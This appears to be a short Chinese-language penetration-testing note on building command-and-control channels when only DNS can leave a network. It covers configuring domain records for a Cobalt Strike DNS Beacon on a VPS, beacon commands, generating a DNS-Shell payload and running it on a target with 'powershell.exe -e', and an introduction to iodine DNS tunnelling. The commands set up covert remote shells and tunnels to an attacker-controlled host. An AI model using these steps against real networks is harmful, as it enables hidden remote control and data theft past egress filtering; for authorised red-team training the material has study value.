---
title: 只有DNS协议出网场景
date: 2025-02-19 03:08:34
updated: 2025-02-19 03:30:26
tags:
  - 内网
  - 隧道搭建
---
# CobaltStrike中DNS Beacon的使用

## 部署域名解析

用一台公网的Linux系统的VPS(39.99.251.19)作为C2服务器(注意：VPS 的 UDP 53 端口一定要开放)。准备好一个可以配置的域名，创建记录 A，将域名解析到 VPS 服务器ip地址；创建 NS 记录，将子域指向域名。![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739934887880-a02a864d-51e9-4687-a783-39e4d2b6d3b8.png)![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739934936280-f96b8569-19bc-42db-91ba-3e702b34d5e8.png)

## 验证**域名解析设置是否成功**

```bash
#  ping通且显示的IP地址正确说明A类解析设置成功
ping c2.xxx.com
# vps监听UDP53端口
tcpdump -n -i eth0 udp dst port 53
# 其他机器
nslookup test.mayfly.vip
#如VPS监听的端口有查询信息，说明第二条记录设置成功
```

## CS监听设置

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1739935264426-e60992e3-9775-42a5-9271-d550b50db454.png)

## 上线成功

```bash
# 上线成功后默认情况下，主机信息是黑色的
checkin
mode dns-txt
# beacon执行完以上2条命令后等待几分钟
```

# **DNS-Shell**

```bash
git clone https://github.com/sensepost/DNS-Shell.git

python2 DNS-shell.py -l -d 10.211.55.15 #该命令会生成一段payload
# 将该 payload 复制，在目标机 cmd 窗口中执行
powershell.exe -e 生成的 payload
```

# iodine搭建隧道

iodine 是基于 C 语言开发的，分为服务端和客户端。iodine 支持转发模式和中继模式。其原理是：通过 TAP 虚拟网卡，在服务端建立一个局域网；在客户端，通过 TAP 建立一个虚拟网卡；两者通过 DNS 隧道连接，处于同一个局域网(可以通过 ping 命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡。[https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)